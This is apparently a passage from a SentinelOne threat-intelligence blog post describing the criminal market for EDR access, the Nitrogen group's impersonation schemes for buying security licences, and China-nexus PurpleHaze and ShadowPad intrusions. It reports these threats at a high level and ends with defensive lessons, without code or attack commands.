<figure id="attachment_120064" aria-describedby="caption-attachment-120064"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_11v2.jpg" alt="Black Basta leak excerpts" width="793" height="328" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_11v2.jpg 793w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_11v2-300x124.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_11v2-768x318.jpg 768w" sizes="auto, (max-width: 793px) 100vw, 793px"><figcaption id="caption-attachment-120064">Black Basta leak excerpts</figcaption></figure>
<h3>Economy/Ecosystem</h3>
<p>There is an increasingly mature and active underground economy built around the buying, selling, and renting of access to enterprise security tools. For the right price, aspiring threat actors continually attempt to obtain time-bound or persistent access to our EDR platform and administrative consoles. Well-known cybercrime forums are filled with vendors openly advertising such access—and just as many buyers actively seeking it. This includes long-established forums like <code>XSS[.]is</code>, <code>Exploit[.]in</code> and RAMP.</p>
<p>That said, more of this activity has been moving to confidential messaging platforms as well (Telegram, Discord, Signal). For example, Telegram bots are used to automate trading this access, and Signal is often used by threat actors to discuss nuance, targeting and initial access operations.</p>
<p>This supply-and-demand dynamic is not only robust but also accelerating. Entire service offerings have emerged around this ecosystem, including “EDR Testing-as-a-Service,” where actors can discreetly evaluate malware against various endpoint protection platforms.</p>
<figure id="attachment_120059" aria-describedby="caption-attachment-120059"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_10.jpg" alt="Proposed Private EDR testing service" width="1053" height="386" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_10.jpg 1053w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_10-300x110.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_10-1024x375.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_10-768x282.jpg 768w" sizes="auto, (max-width: 1053px) 100vw, 1053px"><figcaption id="caption-attachment-120059">Proposed Private EDR testing service</figcaption></figure>
<p>While these testing services may not grant direct access to full-featured EDR consoles or agents, they do provide attackers with semi-private environments to fine-tune malicious payloads without the threat of exposure—dramatically improving the odds of success in real-world attacks.</p>
<figure id="attachment_120053" aria-describedby="caption-attachment-120053"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_4.jpg" alt="Prospective buyer for EDR installs" width="1999" height="455" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_4.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_4-300x68.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_4-1024x233.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_4-768x175.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_4-1536x350.jpg 1536w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_4-221x51.jpg 221w" sizes="auto, (max-width: 1999px) 100vw, 1999px"><figcaption id="caption-attachment-120053">Prospective buyer for EDR installs</figcaption></figure>
<p>Access isn’t always bought, however. Threat actors frequently harvest legitimate credentials from infostealer logs—a common and low-cost method of acquiring privileged access to enterprise environments. In cases where existing customers reuse credentials, this can translate into a threat actor also gaining access to security tools. In more targeted operations, actors have also turned to bribery, offering significant sums to employees willing to sell out their account access.</p>
<p>These insider threats are not hypothetical. For instance, some groups have been observed offering upwards of $20,000 to employees at targeted companies in exchange for insider assistance—an approach openly discussed in the same dark web forums where compromised credentials and access are routinely traded.</p>
<p>On the defensive side, this requires constant monitoring and maintenance. Situational awareness has to be prioritized in order to maintain platform integrity and protect our legitimate customers. Our research teams are constantly monitoring for this style of abuse and access ‘leakage’, focusing on anomalous console access and site-token usage, and taking necessary actions to revoke these access vectors. This prohibits threat actors from fully interacting with the wider platform, and essentially orphans leaked agent installs, limiting the use of the agent in the hands of the threat actor.</p>
<h3>Nitrogen — Threat Operators ‘Leveling Up’</h3>
<p><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_7.jpg" alt="" width="799" height="405" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_7.jpg 799w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_7-300x152.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_7-768x389.jpg 768w" sizes="auto, (max-width: 799px) 100vw, 799px"></p>
<p>Some ransomware operations are now bypassing the underground market altogether—opting instead for more tailored, concentrated-effort impersonation campaigns to gain access to security tools. This approach is epitomized by the Nitrogen ransomware group.</p>
<p>Nitrogen is believed to be operated by a well-funded Russian national with ties to earlier groups like Maze and Snatch. Rather than purchasing illicit access, Nitrogen impersonates real companies—spinning up lookalike domains, spoofed email addresses, and cloned infrastructure to convincingly pose as legitimate businesses. Nitrogen then purchases official licenses for EDR and other security products under these false pretenses.</p>
<p>This kind of social engineering is executed with precision. Nitrogen typically targets small, lightly vetted resellers—keeping interactions minimal and relying on resellers’ inconsistent KYC (Know Your Customer) practices to slip through the cracks.</p>
<p>These impersonation tactics introduce a new layer of complexity for defenders. If a threat actor successfully acquires legitimate licenses from a real vendor, they can weaponize the product to test, evade, and potentially disable protections—without ever having to engage with criminal markets.</p>
<p>This highlights a growing challenge for the security industry: reseller diligence and KYC enforcement are clearly part of the threat surface. When those controls are weak or absent, adversaries like Nitrogen gain powerful new ways to elevate their campaigns—often at a lower cost and lower risk than the black market.</p>
<h3>Lessons Learned and Internal Collaboration</h3>
<p>One of the most impactful lessons from tracking adversaries targeting our platform has been the value of deep, early collaboration across internal teams — particularly those not traditionally pulled into threat response efforts. For example, by proactively engaging with our reseller operations and customer success teams, we can surface valuable signals on questionable license requests, reseller behavior anomalies, and business inconsistencies that could have otherwise gone unnoticed.</p>
<p>By creating shared playbooks, embedding lightweight threat context, and establishing clear escalation paths, reactive processes turn into proactive signal sources. Now, suspicious licensing activity—especially when paired with evasive behaviors or mismatched domain metadata—can surface much earlier in the workflow.</p>
<p>To scale this effort, we increasingly lean into automation. By codifying threat patterns—such as domain registration heuristics, behavioral metadata mismatches, and reseller inconsistencies—organizations can automate enrichment and risk-scoring for incoming licensing requests. This can then be used to dynamically filter, flag, and in some cases, auto-block high-risk activity before it reaches onboarding.</p>
<p>The growing trend of adversaries exploiting sales processes—whether through impersonation, social engineering, or brute-force credential use—means security vendors must treat every access vector, including commercial and operational pipelines, as part of the attack surface. Making cross-functional threat awareness standard operating procedure and integrating detection logic at the edge of business systems is essential.</p>
<p>We’re continuing to improve this work in quiet ways. And while we won’t share every detection logic here (for obvious reasons), we encourage others in the industry to pursue similar internal partnerships. Sales and support teams may already be seeing signs of abuse—security teams just need to give them the lens to recognize it.</p>
<h2>Chinese State-Sponsored Adversaries</h2>
<p>One notable set of activity, occurring over the previous months, involved reconnaissance attempts against SentinelOne’s infrastructure and specific high value organizations we defend. We first became aware of this threat cluster during a 2024 intrusion conducted against an organization previously providing hardware logistics services for SentinelOne employees. We refer to this cluster of activity as PurpleHaze, with technical overlaps to multiple publicly reported Chinese APTs.</p>
<h3>The PurpleHaze Activity Cluster</h3>
<p>Over the course of months, SentinelLABS observed the threat actor conduct many intrusions, including into a South Asian government supporting entity, providing IT solutions and infrastructure across multiple sectors. This activity involved extensive infrastructure, some of which we associate with an operational relay box (ORB) network, and a Windows backdoor that we track as GoReShell. The backdoor is implemented in the Go programming language and uses functionalities from the open-source <a href="https://github.com/NHAS/reverse_ssh" target="_blank" rel="noopener noreferrer">reverse_ssh</a> tool to establish reverse SSH connections to attacker-controlled endpoints.</p>
<p>SentinelLABS collectively tracks these activities under the PurpleHaze moniker. We assess with high confidence that PurpleHaze is a China-nexus actor, loosely linking it to APT15 (also known as Nylon Typhoon, or other various outdated aliases). This adversary is known for its global targeting of critical infrastructure sectors, such as telecommunications, information technology, and government organizations – victimology that aligns with our multiple encounters with PurpleHaze.</p>
<p>We track the ORB network infrastructure observed in the attack against the South Asian government organization as being operated from China and actively used by several suspected Chinese cyberespionage actors, including APT15. The use of ORB networks is a <a href="https://cloud.google.com/blog/topics/threat-intelligence/china-nexus-espionage-orb-networks/" target="_blank" rel="noopener noreferrer">growing</a> trend among these threat groups, since they can be rapidly expanded to create a dynamic and evolving infrastructure that makes tracking cyberespionage operations and their attribution challenging. Additionally, GoReShell malware and its variations, including the deployment mechanism on compromised machines and obfuscation techniques have been exclusively observed in intrusions that we attribute with high confidence to China-nexus actors.</p>
<h3>ShadowPad Intrusions</h3>
<p>In June 2024, approximately four months prior to PurpleHaze targeting SentinelOne, SentinelLABS observed threat actor activity targeting the same South Asian government entity that was also targeted in October 2024. Among the retrieved artifacts, we identified samples of <a href="https://www.sentinelone.com/labs/shadowpad-a-masterpiece-of-privately-sold-malware-in-chinese-espionage/" target="_blank" rel="noopener noreferrer">ShadowPad</a>, a modular backdoor platform used by multiple suspected China-nexus threat actors to conduct cyberespionage. Recent ShadowPad <a href="https://www.trendmicro.com/en_us/research/25/b/updated-shadowpad-malware-leads-to-ransomware-deployment.html" target="_blank" rel="noopener noreferrer">activity</a> has also included the deployment of ransomware, though the motive remains unclear — whether for financial gain or as a <a href="https://www.sentinelone.com/labs/chamelgang-attacking-critical-infrastructure-with-ransomware/" target="_blank" rel="noopener noreferrer">means</a> of distraction, misattribution, or removal of evidence.</p>
<p>The ShadowPad samples we retrieved were obfuscated using <a href="https://cloud.google.com/blog/topics/threat-intelligence/scatterbrain-unmasking-poisonplug-obfuscator" target="_blank" rel="noopener noreferrer">ScatterBrain</a>, an evolution of the <a href="https://www.pwc.co.uk/issues/cyber-security-services/insights/chasing-shadows.html" target="_blank" rel="noopener noreferrer">ScatterBee</a> obfuscation mechanism. Our industry partner, Google Threat Intelligence Group (GTIG), have also observed the use of ScatterBrain-obfuscated ShadowPad samples since 2022 and attribute them to clusters associated with the suspected Chinese APT actor, APT41.</p>
<figure id="attachment_120058" aria-describedby="caption-attachment-120058"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_9.jpg" alt="GTIG APT41 Use of ScatterBrain" width="586" height="117" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_9.jpg 586w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_9-300x60.jpg 300w" sizes="auto, (max-width: 586px) 100vw, 586px"><figcaption id="caption-attachment-120058">GTIG APT41 Use of ScatterBrain</figcaption></figure>
<p>Investigations continue in determining the specific actor overlap between June 2024 ShadowPad intrusions and the later PurpleHaze activity. We do not rule out the involvement of the same threat cluster, particularly given the extensive sharing of malware, infrastructure, and operational practices among Chinese threat groups, as well as the possibility of access transfer between different actors.</p>
<p>Based on private telemetry, we identified a large collection of victim organizations compromised using ScatterBrain-obfuscated ShadowPad. Between July 2024 and March 2025, this malware was used in intrusions at over 70 organizations across various regions globally, spanning sectors such as manufacturing, government, finance, telecommunications, and research. We assess that the threat actor primarily gained initial foothold in the majority of these organizations by exploiting an n-day vulnerability in CheckPoint gateway devices, which aligns with <a href="https://www.orangecyberdefense.com/global/blog/cert-news/meet-nailaolocker-a-ransomware-distributed-in-europe-by-shadowpad-and-plugx-backdoors" target="_blank" rel="noopener noreferrer">previous research</a> on ShadowPad intrusions involving the deployment of ransomware.</p>
<p>Among the victims, we identified the previously mentioned IT services and logistics organization that was at the time responsible for managing hardware logistics for SentinelOne employees. Victim organizations were promptly informed of intrusion specifics, which were swiftly investigated. At this point, it remains unclear whether the perpetrators’ focus was solely on the compromised organization or if they intended to extend their reach to client organizations as well.</p>
<p>A detailed investigation into SentinelOne’s infrastructure, software, and hardware assets found no evidence of secondary compromise. Nevertheless, this case underscores the fragility of the larger supplier ecosystem that organizations depend upon and the persistent threat posed by suspected Chinese threat actors, who continuously seek to establish <a href="https://www.sentinelone.com/labs/operation-digital-eye-chinese-apt-compromises-critical-digital-infrastructure-via-visual-studio-code-tunnels/" target="_blank" rel="noopener noreferrer">strategic footholds</a> to potentially compromise downstream entities.</p>
<p>SentinelLABS will share a detailed public release on this topic in due course, providing further technical information on these activities, including observed TTPs, malware, and infrastructure.</p>
<h3>Lessons Learned While Hardening Our Operational Ecosystem</h3>
<p>Our analysis of the PurpleHaze cluster, and more specifically the potential indirect risk introduced via compromised third-party service providers, has reinforced several key insights around operational security and supply chain monitoring. Even when our own infrastructure remained untouched, the targeting of an external service provider previously associated with business logistics surfaced important considerations.</p>
<p>One immediate reminder is the necessity of maintaining real-time awareness not only over internal assets but also over adjacent service providers—particularly those with past or current access to sensitive employee devices or logistical information. When incidents occur near your supply chain, don’t wait for confirmation of compromise. Proactively trigger internal reviews of asset inventories, procurement workflows, OS images and onboarding deployment scripts, and segmentation policies to quickly identify any exposure pathways and reduce downstream risk.</p>
<p>This leads to several defense recommendations:</p>
<ul>
<li aria-level="1"><strong>Distribute Threat Intelligence Across Operational Stakeholders</strong><br>
Organizations should proactively share campaign-level threat intelligence with business units beyond the traditional security org—particularly those managing vendor relationships, logistics, and physical operations. Doing so enables faster detection of overlap with compromised third parties and supports early reassessment of exposure through external partners.</li>
<li aria-level="1"><strong>Integrate Threat Context Into Asset Attribution Workflows</strong><br>
Infrastructure and IT teams should collaborate with threat intelligence functions to embed threat-aware metadata into asset inventories. This enables more responsive scoping during incident response and enhances the ability to trace supply chain touchpoints that may be at risk.</li>
<li aria-level="1"><strong>Expand Supply Chain Threat Modeling</strong><br>
Organizations should refine their threat modeling processes to explicitly account for upstream supply chain threats, especially those posed by nation-state actors with a history of leveraging contractors, vendors, or logistics partners as indirect access vectors. Tailoring models to include adversary-specific tradecraft enables earlier identification of unconventional intrusion pathways.</li>
</ul>
<p>While attribution continues to evolve and victim impact remains diverse, one thing is clear: well-resourced threat actors are increasingly leaning on indirect routes into enterprise environments. Investigations like this help us sharpen our defenses—not just around traditional digital perimeters but around the full operational footprint of our organization.</p>
<h2>The Strategic Value of Cyber Threat Intelligence</h2>
<p>In today’s threat landscape, threat intelligence has evolved from a niche function into an essential pillar of enterprise defense—particularly for private sector organizations operating in the security space. As threat actors increasingly target security vendors for insider access, abuse of legitimate channels, and supply chain infiltration, the role of CTI in anticipating and disrupting these tactics has become more critical than ever.</p>
<p>One of the most tangible examples of this value is in internal talent acquisition and insider threat defense. Intelligence has become a frontline asset in identifying attempts by North Korean IT workers and other state-backed operatives to embed themselves in organizations under false pretenses. By flagging suspicious applicant patterns, cross-referencing alias histories, and tracking known tradecraft, CTI teams help hiring managers and HR avoid potential insider incidents before they start.</p>
<p>Our CTI capabilities must also directly support sales and channel operations. As criminal groups increasingly impersonate legitimate businesses to acquire security products through trusted resellers, intelligence plays a key role in verifying customer legitimacy and identifying anomalous purchase behaviors. By integrating intelligence insights into pre-sale vetting workflows, a crucial layer of protection is helping to ensure adversaries cannot simply “buy” their way into our technology stack.</p>
<p>Internally, threat intelligence informs and enhances how we defend our own technology and supply chain against highly targeted APT activity. From understanding how adversaries reverse-engineer our software to uncovering which parts of our technology stack they seek to compromise, CTI enables proactive hardening, smarter telemetry prioritization, and meaningful collaboration with product and engineering teams. In essence, intelligence acts as an early-warning system and a strategic guide—ensuring our defenses stay one step ahead of evolving threats.</p>
<p>Across every function—whether it’s HR, Sales, Engineering, or Security—cyber threat intelligence is no longer a backroom function. It’s embedded in the fabric of how we defend, operate, and grow as a business.</p>
									</div></div>]]></description>
        </item>
    </channel>
</rss>